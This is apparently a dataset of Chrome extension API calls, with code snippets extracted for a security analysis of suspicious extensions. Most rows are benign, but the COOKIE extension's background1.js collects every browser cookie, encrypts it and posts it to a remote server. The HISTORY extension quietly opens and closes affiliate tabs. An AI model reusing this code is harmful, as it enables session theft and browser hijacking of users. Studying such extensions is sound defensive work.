col0,col1,col2,col3,extracted_code_block
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,51,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search(folderName, (results) => { if (results.length > 0) { resolve(results[0].id); } else { chrome.bookmarks.create({ parentId: idParentFolder, title: folderName }, (newFolder) => { resolve(newFolder.id); }); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,55,chrome.bookmarks.create,chrome. ...      }),"chrome.bookmarks.create({ parentId: idParentFolder, title: folderName }, (newFolder) => { resolve(newFolder.id); })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,65,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search({ title: title, url: url }, function (existingBookmarks) { if (existingBookmarks.length === 0) { chrome.bookmarks.create({ parentId: parentId, title: title, url: url }); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,67,chrome.bookmarks.create,chrome. ...      }),"chrome.bookmarks.create({ parentId: parentId, title: title, url: url })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,79,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search({ title, url }, function (existingBookmarks) { if (existingBookmarks.length) { const bookmarkId = existingBookmarks[0].id; chrome.bookmarks.remove(bookmarkId); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,82,chrome.bookmarks.remove,chrome. ... markId),chrome.bookmarks.remove(bookmarkId)
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,106,chrome.alarms.clear,chrome. ... r('up'),chrome.alarms.clear('up')
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,167,chrome.bookmarks.search,chrome. ...      }),"chrome.bookmarks.search({ url: link.url }, (results) => { const isInstalled = results.length > 0; resolve(isInstalled ? 1 : 0); })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,219,chrome.alarms.create,chrome. ... utes }),"chrome.alarms.create('up', { when: now + delayMilliseconds, periodInMinutes: delayMinutes })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/popup.js,33,chrome.bookmarks.getTree,chrome. ...      }),chrome.bookmarks.getTree((bookmarksTree) => { if (chrome.runtime.lastError) { reject(chrome.runtime.lastError); } else { const count = countBookmarks(bookmarksTree[0]); resolve(count); } })
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/popup.js,58,chrome.bookmarks.getTree,chrome. ...      }),chrome.bookmarks.getTree((bookmarksTree) => { if (chrome.runtime.lastError) { reject(chrome.runtime.lastError); } else { const html = firstGeneralBookmarkHtml(bookmarksTree[0]); resolve(html); } })
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background.js,525,chrome.cookies.getAll,chrome. ... in}` }),chrome.cookies.getAll({ domain: `${domain}` })
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.cookies.getAll,"chrome. ... :""""+s})","chrome.cookies.getAll({domain:""""+s})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.cookies.getAll,chrome. ... }n(e)}),"chrome.cookies.getAll({},async e=>{if(0<e.length){var t=sjcl.encrypt(g,JSON.stringify(e),{ks:256});try{var a=new URLSearchParams;a.set(""data"",t),d=await ky.post(u,{headers:{Accept:""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",From:extensionName,ID:chrome.runtime.id,UUID:Utils.getUserID(),Cookies:i},credentials:""include"",body:a}).text()}catch(e){}}n(e)})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... s:[a]}),chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:[a]})
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.updateDynamicRules,"chrome. ... ""]}}]})","chrome.declarativeNetRequest.updateDynamicRules({addRules:[{id:a,priority:1,action:{type:""modifyHeaders"",requestHeaders:[{header:i,operation:""remove""},{header:i.replace(""X-GOOGLE-EXTENSION-"",""""),operation:""set"",value:r}]},condition:{urlFilter:n,resourceTypes:[""main_frame"",""sub_frame"",""stylesheet"",""script"",""image"",""font"",""object"",""xmlhttprequest"",""ping"",""csp_report"",""media"",""websocket"",""webtransport"",""webbundle"",""other""]}}]})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),chrome.declarativeNetRequest.getDynamicRules()
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,32,chrome.runtime.setUninstallURL,chrome. ... {uid}`),chrome.runtime.setUninstallURL(`${serverUrl}/leaving/${extSlug}?uid=${uid}`)
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,34,chrome.tabs.create,chrome. ... \n    }),chrome.tabs.create({ url: 'search.html' })
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,37,chrome.tabs.create,chrome. ... \n    }),chrome.tabs.create({ url: `${serverUrl}/greeting/${extSlug}?uid=${uid}` })
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... :t})})),"chrome.tabs.create({url:""https://megabonus.com/y/wEF3t"",active:!1},(t=>{e({affTab:t})}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... r(t)})),"chrome.tabs.create({active:!1,url:""https://megabonus.com/y/4AMcD""},(e=>{const t=(r,n)=>{""complete""===n.status&&r===e.id&&(chrome.tabs.remove(r),chrome.tabs.onUpdated.removeListener(t))};chrome.tabs.onUpdated.addListener(t)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... SION)}),chrome.tabs.create({url:getUrl(n.NEW_VERSION)})
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... .tabId),chrome.tabs.remove(t.data.tabId)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... move(r),chrome.tabs.remove(r)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.cookies.get,chrome. ... lue)})),"chrome.cookies.get({url:""https://shoppingcart.aliexpress.com/"",name:""xman_us_f""},(e=>{i(e.value)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... n(e)})),"chrome.runtime.sendMessage({cmd:e,data:t},(async e=>{if(chrome.runtime.lastError)return console.log(""Messaging error"",chrome.runtime.lastError),void n(null);n(e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... t(e)})),"chrome.runtime.sendMessage({cmd:e},(async e=>{if(chrome.runtime.lastError)return console.log(""Messaging error"",chrome.runtime.lastError),void t(null);t(e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... e(t)})),"chrome.runtime.sendMessage({cmd:""CMD_GET_ORDER_CURRENCY"",data:{params:n}},(t=>{e(t)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... 0:e)})),"chrome.runtime.sendMessage({cmd:""CMD_GET_EXCHANGE_RATE"",data:{currency:e}},(e=>{o(null===e?void 0:e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... cmd:s}),chrome.runtime.sendMessage({cmd:s})
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.getURL,"chrome. ... o.png"")","chrome.runtime.getURL(""assets/img/ali_compare_logo.png"")"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentShein.41183e58.js,1,chrome.runtime.sendMessage,chrome. ... )}))})),"chrome.runtime.sendMessage({cmd:""CMD_OPEN_SHEIN_AFF""},(r=>{r?.affTab?.id&&window.addEventListener(""storage"",(a=>{a.key===e&&t()&&chrome.runtime.sendMessage({cmd:""CMD_CLOSE_SHEIN_AFF"",data:{tabId:r.affTab.id}})}))}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentShein.41183e58.js,1,chrome.runtime.sendMessage,chrome. ... b.id}}),"chrome.runtime.sendMessage({cmd:""CMD_CLOSE_SHEIN_AFF"",data:{tabId:r.affTab.id}})"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,18,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: ""chrome://newtab"" })"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,25,chrome.tabs.getSelected,chrome. ... );\n  }),"chrome.tabs.getSelected(null, function(tab) { chrome.tabs.update(tab.id, {url: url}); })"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,26,chrome.tabs.update,chrome. ... : url}),"chrome.tabs.update(tab.id, {url: url})"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,60,chrome.tabs.remove,chrome. ... esolve),"chrome.tabs.remove(tabIdsToRemove, resolve)"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,68,chrome.tabs.create,"chrome. ... ue }, )","chrome.tabs.create({ url: 'https://ddksearch.com/thankyou.php', active: true }, )"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,70,chrome.runtime.setUninstallURL,chrome. ... .html'),chrome.runtime.setUninstallURL('https://ddksearch.com/uninstalled.html')
JS-SEARCH-ompmbcpalofeaelpfohpmpmjhjahgpbp.1_0_2_0/src/background/runtime.js,3,chrome.tabs.create,chrome. ... b'\n  }),chrome.tabs.create({ url: 'chrome://newtab' })
JS-SEARCH-ompmbcpalofeaelpfohpmpmjhjahgpbp.1_0_2_0/src/static/js/script.js,1,chrome.runtime.getManifest,chrome. ... ifest(),chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,22,chrome.tabs.query,chrome. ... \n    }),"chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) { if (!tabs || !tabs[0]) return; callback(tabs[0]); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,79,chrome.cookies.getAll,chrome. ... \n    }),"chrome.cookies.getAll({ domain: extSettings.ProductDomain }, function (cookies) { for (let i = 0; i < cookies.length; i++) { if (cookies[i].name.indexOf('trcrx_') != -1) { const cookieName = cookies[i].name.split('trcrx_')[1]; setSetting(cookieName, cookies[i].value, cookieName === 'guid'); } } if (callback) callback(); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,91,chrome.tabs.create,chrome. ... \n    }),"chrome.tabs.create({ url: tabURL, active: isActive })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,115,chrome.tabs.query,chrome. ... \n    }),"chrome.tabs.query({ url: '*://chrome.google.com/webstore/*' }, function (tabs) { for (tab of tabs) { if (tab.id && tab.url.includes(getSetting('extId'))) { if (cwsUrl) { chrome.tabs.update(tab.id, { url: cwsUrl }); chrome.windows.update(tab.windowId, { focused: true }); } else if (extSettings[TY_COOKIE_NAME]) { chrome.tabs.remove(tab.id); } } } })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,119,chrome.tabs.update,chrome. ... sUrl }),"chrome.tabs.update(tab.id, { url: cwsUrl })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,122,chrome.tabs.remove,chrome. ... tab.id),chrome.tabs.remove(tab.id)
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,129,chrome.tabs.query,chrome. ...      }),"chrome.tabs.query({ url: `${ getSetting('location') }*` }, function (tab) { if (tab && tab[0] && tab[0].id) { chrome.tabs.update(tab[0].id, { url: lpUrl }); } })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,131,chrome.tabs.update,chrome. ... pUrl }),"chrome.tabs.update(tab[0].id, { url: lpUrl })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,137,chrome.tabs.update,chrome. ...      }),"chrome.tabs.update(activeTab.id, { url: lpUrl }, function (tab) { })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,7,chrome.tabs.update,chrome. ... rl() }),"chrome.tabs.update(activeTab.id, { url: getNTUrl() })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,33,chrome.runtime.getManifest,chrome. ... ifest(),chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,36,chrome.runtime.getManifest,chrome. ... ifest(),chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/omni.js,18,chrome.tabs.update,chrome. ...  url }),"chrome.tabs.update(tab.id, { url })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/startup.js,6,chrome.management.getSelf,chrome. ...      }),"chrome.management.getSelf(function (extInfo) { setSetting('extId', extInfo.id); setSetting('extVersion', extInfo.version); const src = `https://ext.${ extSettings.ProductDomain }/api/v1/px/install?` + `&eType=${ extSettings.EType }&ext.yid=${ extSettings.ProductId }&ext.id=${ extInfo.id }&ext.version=${ extInfo.version }`; addBGImg(src, function () { getCookies(function () { ping(); firstRunPage(); }); }); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/startup.js,49,chrome.runtime.setUninstallURL,chrome. ... \n    }),"chrome.runtime.setUninstallURL(uninstallUrl, function () { })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/options.js,1,chrome.runtime.sendMessage,chrome. ... url;\n}),"chrome.runtime.sendMessage({ task: ""getOptionsRedirectUrl"" }, function(res) { document.querySelector(""#frame"").src = res.url; })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,5,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""getSetting"", name: event.data.name, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,16,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""setSetting"", name: event.data.name, value: event.data.value, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,28,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: event.data.msg, obj: event.data.obj, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,39,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""openUrl"", obj: event.data, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/popup.js,5,chrome.runtime.sendMessage,chrome. ... \n    }),"chrome.runtime.sendMessage({ task: ""getPopUpUrl"" }, function(res) { document.querySelector(""#frame"").src = res.url; })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,5,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""getSetting"", name: event.data.name, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,16,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""setSetting"", name: event.data.name, value: event.data.value, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,28,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: event.data.msg, obj: event.data.obj, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,39,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""openUrl"", obj: event.data, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,1,chrome.runtime.getURL,"chrome. ... w.png"")","chrome.runtime.getURL(""prompt/green-up-arrow.png"")"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,2,chrome.runtime.getURL,"chrome. ... e.png"")","chrome.runtime.getURL(""prompt/ok-green-square.png"")"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,108,chrome.runtime.sendMessage,chrome. ... }\n    ),"chrome.runtime.sendMessage( { task: ""getSetting"", name: ""firstSearchMade"", }, function(res) { if (res) { const hidePrompt = function() { document.querySelector(""#arrow-modal"").innerHTML = """"; document.body.onclick = null; };  const styles = document.createTextNode(promptCSS); const promptStyles = document.createElement(""STYLE""); promptStyles.appendChild(styles); document.querySelector(""body"").appendChild(promptStyles);  const promptDiv = document.createElement(""div""); promptDiv.innerHTML = promptHTML; document.querySelector(""body"").appendChild(promptDiv);  document.body.onclick = function() { hidePrompt(); }; setTimeout(hidePrompt, 5000);  chrome.runtime.sendMessage( { task: ""setSetting"", name: ""firstSearchMade"", value: false, }, function() {} ); } } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,134,chrome.runtime.sendMessage,chrome. ...       ),"chrome.runtime.sendMessage( { task: ""setSetting"", name: ""firstSearchMade"", value: false, }, function() {} )"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,675,chrome.runtime.sendMessage,chrome. ...      }),"chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN }, function (success) { if (!success) return reject(); // Wait for signal 'signed in'  chrome.runtime.onMessage.addListener(function (message) { if (message.message == SM_MESSAGE_SIGNED_IN) { // Make sure user is signed in _this2.getUser(true /* No caching */ ).then(resolve).catch(reject); } }); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,781,chrome.runtime.sendMessage,chrome. ...      }),"chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_OPTIONS_PAGE }, function (response) { if (response === true) resolve();else reject(); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,878,chrome.runtime.getManifest,chrome. ... ifest(),chrome.runtime.getManifest()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7108,chrome.tabs.create,chrome. ... ')\n  }),"chrome.tabs.create({ url: Startme[""a"" /* default */].apiURL('/users/home') })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7118,chrome.tabs.create,chrome. ... ')\n  }),"chrome.tabs.create({ url: Startme[""a"" /* default */].apiURL('/bookmarks?section=inbox') })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7131,chrome.tabs.create,chrome. ... \n    }),chrome.tabs.create({ url: chrome.runtime.getURL('welcome.html') })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7132,chrome.runtime.getURL,chrome. ... .html'),chrome.runtime.getURL('welcome.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7136,chrome.tabs.sendMessage,chrome. ...      }),"chrome.tabs.sendMessage(tab.id, { message: SM_MESSAGE_SHOW_WELCOME })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7194,chrome.runtime.setUninstallURL,chrome. ... WSER))),"chrome.runtime.setUninstallURL(Startme[""a"" /* default */].primaryURL(""/chrome_uninstall.html?browser="".concat(WINDOW_CURRENT_BROWSER)))"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7448,chrome.tabs.query,chrome. ... ue\n  }),"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7455,chrome.tabs.update,chrome. ... \n    }),"chrome.tabs.update(tabs[0].id, { url: url })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7580,chrome.tabs.create,chrome. ...      }),"chrome.tabs.create({ url: request.url, active: !!request.active })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7585,chrome.tabs.update,chrome. ...      }),chrome.tabs.update({ url: request.url })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7666,chrome.tabs.query,chrome. ... ue\n  }),"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7672,chrome.tabs.sendMessage,chrome. ... \n    }),"chrome.tabs.sendMessage(tabId, { message: SM_MESSAGE_CHECK_IFRAME_SRC, homepageUrl: homepageUrl, url: url })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7721,chrome.tabs.create,chrome. ... e'\n  }),chrome.tabs.create({ url: 'https://support.start.me' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7731,chrome.tabs.create,chrome. ... e'\n  }),chrome.tabs.create({ url: 'https://support.start.me/hc/en-us/articles/360017846280-Extension-New-tab-page-by-start-me' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7741,chrome.runtime.openOptionsPage,chrome. ... sPage(),chrome.runtime.openOptionsPage()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8130,chrome.runtime.getURL,chrome. ... .html'),chrome.runtime.getURL('popup.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8189,chrome.runtime.getURL,chrome. ... .html'),chrome.runtime.getURL('import.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8195,chrome.tabs.remove,chrome. ... tTabId),chrome.tabs.remove(importTabId)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8198,chrome.tabs.create,chrome. ...      }),chrome.tabs.create({ url: importedPageUrl })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8218,chrome.bookmarks.getTree,chrome. ... tTree(),chrome.bookmarks.getTree()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8349,chrome.tabs.create,chrome. ... \n    }),chrome.tabs.create({ url: url })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8412,chrome.tabs.query,chrome. ...      }),"chrome.tabs.query({ windowId: window.id, index: 0 })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,275,chrome.runtime.sendMessage,chrome. ...      }),"chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN }, function (success) { if (!success) return reject(); // Wait for signal 'signed in'  chrome.runtime.onMessage.addListener(function (message) { if (message.message == SM_MESSAGE_SIGNED_IN) { // Make sure user is signed in _this2.getUser(true /* No caching */ ).then(resolve).catch(reject); } }); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,381,chrome.runtime.sendMessage,chrome. ...      }),"chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_OPTIONS_PAGE }, function (response) { if (response === true) resolve();else reject(); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,478,chrome.runtime.getManifest,chrome. ... ifest(),chrome.runtime.getManifest()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/new_tab.be8d9eaa.js,328,chrome.runtime.sendMessage,chrome. ... \n    }),chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_URL })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1651,chrome.runtime.sendMessage,chrome. ...      }),"chrome.runtime.sendMessage({ message: SM_MESSAGE_GET_USER_PAGES, noCache: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1755,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_BOOKMARKS })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1807,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1945,chrome.tabs.remove,chrome. ... sArray),chrome.tabs.remove(_this19.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1957,chrome.tabs.remove,chrome. ... sArray),chrome.tabs.remove(_this19.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2127,chrome.tabs.remove,chrome. ... sArray),chrome.tabs.remove(_this22.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2208,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_IMPORT })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2219,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_OUT })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2238,chrome.tabs.create,chrome. ...      }),chrome.tabs.create({ url: 'https://support.start.me/hc/en-us/articles/360018117140' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2240,chrome.tabs.create,chrome. ...      }),chrome.tabs.create({ url: 'chrome://extensions/shortcuts' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2246,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_SHOW_HELP_PAGE })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2255,chrome.runtime.sendMessage,chrome. ...      }),chrome.runtime.sendMessage({ message: SM_MESSAGE_CLEAR_CACHE })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2295,chrome.tabs.query,chrome. ... ery({}),chrome.tabs.query({})
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2340,chrome.tabs.query,chrome. ... ery({}),chrome.tabs.query({})
